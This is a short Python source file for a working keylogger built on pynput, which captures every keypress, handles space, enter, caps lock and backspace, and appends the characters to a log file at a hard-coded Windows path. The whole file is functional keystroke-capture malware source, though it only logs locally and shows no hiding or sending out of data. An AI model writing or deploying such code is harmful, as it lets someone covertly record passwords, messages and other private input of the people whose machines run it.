from pynput.keyboard import Listener
import os


caps_lock_on = False
CHARS = "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJLMNÑOPQRSTUVWXYZ0123456789!\"·$%&/()=?¿¡'`^[+*]´¨{ç\},;.:-_<>|@#~¬\n\\ºª "

def write(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.caps_lock":
        global caps_lock_on
        caps_lock_on = not caps_lock_on
        key = ""
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        if os.path.getsize("C:\\Programación\\Keylogger\\logger.txt") != 0:
            with open("C:\\Programación\\Keylogger\\logger.txt", 'rb+') as filehandle:
                filehandle.seek(-1, os.SEEK_END)
                filehandle.truncate()
            key = ""
    if caps_lock_on:
        key = key.upper()
    if key in CHARS:
        open("C:\\Programación\\Keylogger\\logger.txt", "a").write(key)
    

with Listener(on_press=write) as listener:
    listener.join()
